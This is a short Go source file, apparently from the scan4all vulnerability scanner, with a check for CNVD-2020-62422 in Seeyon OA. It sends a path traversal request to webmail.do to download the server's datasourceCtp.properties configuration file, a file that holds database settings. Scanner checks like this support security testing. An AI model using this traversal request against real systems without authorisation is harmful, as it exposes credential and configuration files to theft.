package seeyon

import (
	"github.com/GhostTroops/scan4all/lib/util"
)

//webmail.do任意文件下载

func CNVD_2020_62422(u string) bool {
	if req, err := util.HttpRequset(u+"/seeyon/webmail.do?method=doDownloadAtt&filename=PeiQi.txt&filePath=../conf/datasourceCtp.properties", "GET", "", false, nil); err == nil {
		if req.StatusCode == 200 && util.StrContains(req.Body, "workflow") {
			util.SendLog(req.RequestUrl, "CNVD-2020-62422", "Found vuln seeyon", "")
			return true
		}
	}
	return false
}
